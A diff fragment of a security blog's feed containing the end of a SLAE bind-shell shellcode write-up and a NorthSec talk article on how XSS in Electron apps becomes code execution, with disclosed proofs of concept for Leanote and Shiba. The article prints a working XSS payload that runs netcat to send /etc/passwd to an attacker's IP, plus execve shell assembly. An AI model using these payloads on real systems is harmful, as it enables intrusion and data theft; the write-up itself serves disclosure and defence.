+&lt;h4 id=&quot;finale---execve&quot;&gt;&lt;b&gt;Finale - execve()&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;Execve() takes 3 arguments: the file we want to execute which for us is the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, as we it is a pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;const char *filename&lt;/code&gt; we need RDI to contain the address on which we have stored the program name. This is the reason why we first move the string in hex to RBX, push on the top of the stack and then move the address to RDI.&lt;/p&gt;
+
+&lt;p&gt;Next we need to get the address of an array of string constants &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;/bin/sh&quot;, NULL};&lt;/code&gt; to RSI. For that we can just push the address we have at RDI to the top of the stack and move that stack address to RSI.&lt;/p&gt;
+
+&lt;p&gt;Third, we do not want to pass any environment variables, so we can make the 3rd argument just 0. So to finish it up, let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall number via &lt;code class=&quot;highlighter-rouge&quot;&gt;ausyscall execve&lt;/code&gt;, read it to RAX and have a go on the last syscall for this task.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e69622f&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Full assembly code can be found at:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Full C code:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 1/7 task of the SLAE certificate exam of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection. Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">Only an Electron Away from Code Execution</title><link href="http://localhost:4000/blog/2018-12-01-electron/" rel="alternate" type="text/html" title="Only an Electron Away from Code Execution" /><published>2018-12-01T00:00:00+02:00</published><updated>2018-12-01T00:00:00+02:00</updated><id>http://localhost:4000/blog/electron</id><content type="html" xml:base="http://localhost:4000/blog/2018-12-01-electron/">&lt;p&gt;This article is supporting my talk at the &lt;a href=&quot;https://nsec.io/speakers/#silvia-v-li&quot;&gt;NorthSec 2018&lt;/a&gt; conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found &lt;strong&gt;&lt;a href=&quot;https://docs.google.com/presentation/d/1uJDFQncxCB_0CddZSPVCq7FhKQVH6ku_RuV17Pbm2RU/edit?usp=sharing&quot;&gt;here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Electron framework enables to create multi-platform desktop applications by only using web technologies like HTML, JavaScript and CSS. This has allowed the adventurous web application developers to cross the border over to the desktop environment with ease. Big names like Skype, Wire, GitKraken, Slack and so many others have already adopted the framework and tons of open source projects in Github and the ones advertised on the official Electron website have followed. Exploring new frameworks is good, but should be done with good caution! I will explain why.&lt;/p&gt;
+
+&lt;p&gt;Over the decades, various security techniques to mitigate desktop specific vulnerabilities have been developed, which makes it difficult to successfully exploit traditional desktop applications. Now, when the web technologies have been released into the ‘wild’ a.k.a to the desktop in this case, the web-based vulnerabilities should be reappraised as the consequences can be significantly different than expected. To get to the main part of this article, let me feed you some background information.&lt;/p&gt;
+
+&lt;h3 id=&quot;multi-process-architecture&quot;&gt;&lt;strong&gt;Multi-process architecture&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;When I am talking about the Electron framework, it really means talking about its 3 core components: Node.js, the libchromiumcontent module from the Chromium project (the core code needed to render a page) and the V8 JavaScript engine. Similarly to Chromium, Electron uses a multi-process architecture. What this means is that if you take a look at a launched Electron application, you would notice 2 types of processes being created: 1 main process and 1 or multiple renderer processes associated with it. Each of those processes is running concurrently with others and their resources as well as the memory are isolated from eachother. This here works sort of like a safety mechanism.&lt;/p&gt;
+
+&lt;h4 id=&quot;main-process&quot;&gt;&lt;strong&gt;Main process&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;To avoid the information overload, let’s focus here on couple of the key points about the processes. The main process in Electron applications is what is responsible for creating and managing web pages and for a life-cycle of events throughout the life-time of the application. Renderer process however is responsible for displaying the chosen content to the user. To paint you a bigger picture of how Electron apps can look like, let’s take the simplest example possible. An Electron app which consists of 3 files: main.js, index.html and package.json.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Electron&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;json&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;point&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Package.json is what holds the main script, which in our example is the file called main.js. If not specified, it would always fall back to index.js by default. This is the script which gets executed within the main process. You can imagine it to be the entry point to the application. Now, index.html however is what contains the actual page content we want to display to our user. This would be executed within the renderer process. &lt;strong&gt;A new renderer process is created with every browserWindow instance created in the main process.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Electron framework, in order to provide you the desktop-like experience, allows the developers to make use of all
+the built-in Node.js modules. In addition, it comes with a set of framework specific APIs accessible to the main or to the renderer processes and in some cases to both. The entire list of framework specific APIs which Electron provides you can be found in &lt;a href=&quot;https://electronjs.org/docs/api&quot;&gt;here&lt;/a&gt;. One of those APIs available to the main process is the &lt;a href=&quot;https://electronjs.org/docs/api/browser-window&quot;&gt;BrowserWindow API&lt;/a&gt; from which the BrowserWindow method can be used to create a new page.&lt;/p&gt;
+
+&lt;p&gt;An example from main.js where new BrowserWindow instance is created with specific size attributes to display the content of index.html:&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BrowserWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'electron'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BrowserWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'closed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+
+  &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loadURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'....example/index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;webpreference-options&quot;&gt;&lt;strong&gt;webPreference options&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;Our next piece of the puzzle is to know that with every new BrowserWindow instance, a set of webPreference options
+becomes available. These options are basically a set of features by which we can control the newly created renderer process.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/webPreferences.png&quot; alt=&quot;&quot; title=&quot;WebPreference options&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For example:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;nodeIntegration&lt;/strong&gt;: enable/disable Node.js engine (default: True)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: enable/disable JavaScript support (default: True)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;WebSecurity&lt;/strong&gt;: enable/disable Same-origin policy (default: True)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Sandbox&lt;/strong&gt;: enable/disable the sandbox for the renderer process (default: False)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Based on the previous example project with 3 files, let’s focus here on the nodeIntegration option and let’s say the content
+in our index.html file is as shown below. We have a script where we attempt to require the ‘os’ module in order to ask
+further questions about the platform and the home directory on which the application is running upon.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;os&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;homedir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;homedir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'Hostname: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Home directory'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;homedir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we place this script into a context where we have set &lt;code class=&quot;highlighter-rouge&quot;&gt;nodeIntegration:True&lt;/code&gt; for the renderer process, we see the
+results to questions we asked for. However disabling the same option results in disabling the Node.js engine and losing
+the desktop like experience.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/nodeIntegration.png&quot; alt=&quot;&quot; title=&quot;NodeIntegration option&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here it is completely legitimate and the intended behaviour as this is what the framework was designed for us to do.
+But let’s keep on digging.&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-scripting-xss-vulnerability--nodeintegration-hotpot&quot;&gt;Cross-site scripting (XSS) vulnerability &amp;amp; nodeIntegration hotpot&lt;/h2&gt;
+
+&lt;p&gt;Cross-site scripting has been around since the 90’s and we can pretty much agree on that fighting against it is pretty
+much a lost cause, and if there was a button to make XSS disappear, we as the IT security people would most likely not
+push it (if you know what I mean). It is not every day we are dealing with desktop applications built only by using web
+technologies. As you might remember, I stated in the beginning of this post that vulnerabilities out of their normal
+environments should be reappraised as they might end up having unexpected consequences. So let me answer your question:
+“&lt;strong&gt;Yes, Electron applications can be vulnerable to XSS&lt;/strong&gt;”, however it also might end up magically evolving into local
+or remote code execution as well. So taking our favourite script from the index.html file and sticking it in user input
+fields can get you further than what the intended behavior of the application really was.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/xss.png&quot; alt=&quot;&quot; title=&quot;XSS + nodeIntegration:True&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;the-freedom-of-electron&quot;&gt;The Freedom of Electron&lt;/h3&gt;
+
+&lt;p&gt;As Electron is suppose to give you the desktop like experience, a lot of the default values of the provided options in the framework make sure that your applications will sort of work “out-of-the-box”. Let me give you an example. So when you launch your Electron app, you can see that by default all the renderer process are always created with NodeIntegration enabled and without the protective layer of the sandbox. This is for your own convenience here. However too much freedom, and we might have a disaster in our hands.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/freedom.png&quot; alt=&quot;&quot; title=&quot;XSS + nodeIntegration:True&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So while doing this project, based on what I observed or sometimes had a ‘gut feeling’ about, I created some assumptions which led me to believe that:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;developers  would not be too much alarmed about the web vulnerabilities occurring in a desktop environment;&lt;/li&gt;
+  &lt;li&gt;as applications worked “out-of-the-box”, developers would not be too familiar with any of the webPreference options they were given by default and most likely leave them untouched (these options were optional anyway, sort of).&lt;/li&gt;
+  &lt;li&gt;based on the second assumption, if I manage to find XSS then most likely (it will!) evolve into local or remote code execution.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To prove my assumptions I took a step further, so bare with me!&lt;/p&gt;
+
+&lt;h3 id=&quot;hunting-for-code-execution&quot;&gt;Hunting for code execution&lt;/h3&gt;
+
+&lt;p&gt;.. proved to be easier than I had imagined. I began with 30 applications selected from Github and decided to gather some
+ initial information on the apps I was looking at. You can get more detailed information and specific numbers from my slides, but let’s focus here on the webPreferences and nodeIntegration specifically.&lt;/p&gt;
+
+&lt;p&gt;What I discovered was that those &lt;strong&gt;30 applications&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;created total of &lt;strong&gt;52 new BrowserWindow instances&lt;/strong&gt;;&lt;/li&gt;
+  &lt;li&gt;webPreferences (&lt;strong&gt;nodeIntegration&lt;/strong&gt;):
+    &lt;ul&gt;
+      &lt;li&gt;in &lt;strong&gt;41 cases nodeIntegration was left to its default value&lt;/strong&gt; of True (therefore left untouched as I assumed);&lt;/li&gt;
+      &lt;li&gt;in &lt;strong&gt;5 cases nodeIntegration was set to True&lt;/strong&gt; even though this was already its default value;&lt;/li&gt;
+      &lt;li&gt;in &lt;strong&gt;6 cases nodeIntegration was set to False&lt;/strong&gt;, so I guess these were the cases where developers were actually aware what this option does.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Based on those numbers, I had &lt;strong&gt;30 applications and 46 promising chances to go and hunt for the XSS-s&lt;/strong&gt; which would evolve into code execution. This also proved my assumption that default options would most likely be left untouched, therfore needing any kind of nodeIntegration bypasses would be extremely rare.&lt;/p&gt;
+
+&lt;p&gt;As a result I ended up with 10 applications with a XSS vulnerability and out of those 9 were my perfect match: XSS &amp;amp;
+nodeIntegration:True. So after finding the XSS, it was highly likely that nodeIntegration option would also be enabled.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/findings.png&quot; alt=&quot;&quot; title=&quot;XSS + nodeIntegration:True&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;poc-leanote---knowledge-blog-sharing-cooperation-all-in-leanote&quot;&gt;PoC: Leanote - “Knowledge, Blog, Sharing, Cooperation… all in Leanote”&lt;/h2&gt;
+
+&lt;p&gt;Reported: 25, Nov, 2017&lt;br /&gt;
+Fixed: 29, Nov 2017 (version 2.6)&lt;/p&gt;
+
+&lt;p&gt;Leanote is a note-keeping/note-sharing desktop application which by feature allows you to synchronize your data from its web application. The vulnerable field, which led to code execution (&lt;strong&gt;CVE 2017-1000492&lt;/strong&gt;) was the title of the created
+note which the user marked as favourite. This application was a perfect case of a vulnerability not being present in the
+web application, but as soon as the notes with the attack code were synchronised onto the desktop things got bad.&lt;/p&gt;
+
+&lt;p&gt;PoC code was presented by using the &lt;a href=&quot;https://nodejs.org/api/child_process.html&quot;&gt;child_process&lt;/a&gt; module from the built-in
+Node.js modules in order to get a reverse shell connecting back to the attacker’s machine and stealing the victim’s
+/etc/passwd file.&lt;/p&gt;
+
+&lt;p&gt;Attacker launched from command line:: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -l -p 1337 &amp;gt; passwd.txt&lt;/code&gt;&lt;br /&gt;
+Attacker creates a new favourite note with a crafted payload to the victim’s notebook:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;s &amp;lt;onmouseover=&quot;alert(1)&quot;&amp;gt; &amp;lt;s onmouseover=&quot;const exec= require('child_process').exec;
+exec('nc -w 3 192.168.8.100 1337 &amp;lt; /etc/passwd', (e, stdout, stderr)=&amp;gt; { if (e instanceof Error) {
+console.error(e); throw e; } console.log('stdout ', stdout);
+console.log('stderr ', stderr);});
+alert('1')&quot;&amp;gt;Hallo&amp;lt;/s&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If this is not the easiest code execution you have ever seen, then I don’t know what is!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/leanote.png&quot; alt=&quot;&quot; title=&quot;Leanote&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;poc-shiba---rich-markdown-live-preview-app&quot;&gt;PoC: Shiba - rich markdown live preview app&lt;/h2&gt;
+
+&lt;p&gt;Reported: 25, Nov, 2017 v1.1.0&lt;br /&gt;
+Fixed: 30, Nov 2017 (version v1.1.1)&lt;/p&gt;
+
+&lt;p&gt;Shiba is a markdown editor, where the vulnerable field happened to be the file content field (&lt;strong&gt;CVE 2017-1000491&lt;/strong&gt;) itself.
+So if the attacker manages to trick the victim to open any kind of crafted file within the Shiba app, it’s game over.
+Let’s use the same PoC code as in the previous example to illustrate better the essence of how easily XSS can evolve
+into code execution in Electron apps.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/electron/shiba3_wmv.gif&quot; alt=&quot;&quot; title=&quot;Shiba - PoC&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;takeaway--ideas&quot;&gt;Takeaway &amp;amp; ideas&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Takeaways:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;electron is a wonderful framework for easy multi-platform development for desktop applications, specially if you have
+never developed for desktop before&lt;/li&gt;
+  &lt;li&gt;my personal takeaway was definitely validation to my assumptions.Developers have come to experiement in the new playing field and “old habits die hard”, so the web-vulnerabilities emerge in new environment and quite often&lt;/li&gt;
+  &lt;li&gt;if the framework provides you with a lot of freedom for your applications to work “out-of-the-box”, the webprefeence options are most likely left untouched. Even when we are dealing with, let’s say static pages which do not need access to interacting with the system.&lt;/li&gt;
+  &lt;li&gt;Electron is a wonderful playing field at the moment with lots of golden findings&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Ideas:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;future developement? Limit the attacker’s activities in case of XSS by restricting to require any extra modules than specifically marked in the application’s configuration file.&lt;/li&gt;
+  &lt;li&gt;Set nodeIntegration option to False by default:
+    &lt;ul&gt;
+      &lt;li&gt;It would need an extra movement from the developers if interaction with the system is necessary within the renderer process. However, if interacting with the system underneath the application is not needed, then the Node.js engine would already be set to false by default (safer option, as devs do not pay enough attention to those options or if its simpy forgotten). This could reduce the potential severity of the cross-site scripting vulnerabilities if such occurrs.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This article is supporting my talk at the NorthSec 2018 conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found here.</summary></entry><entry><title type="html">Message boxes</title><link href="http://localhost:4000/blog/2018-06-01-blog-content-iii/" rel="alternate" type="text/html" title="Message boxes" /><published>2018-06-01T00:00:00+03:00</published><updated>2018-06-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-content-iii</id><content type="html" xml:base="http://localhost:4000/blog/2018-06-01-blog-content-iii/">&lt;p class=&quot;message&quot;&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: You can add a message box.&lt;/p&gt;
+
+&lt;h2 id=&quot;large-text&quot;&gt;Large text&lt;/h2&gt;
+&lt;p class=&quot;lead&quot;&gt;You can add large text.&lt;/p&gt;
+
+&lt;h2 id=&quot;large-images&quot;&gt;Large images&lt;/h2&gt;
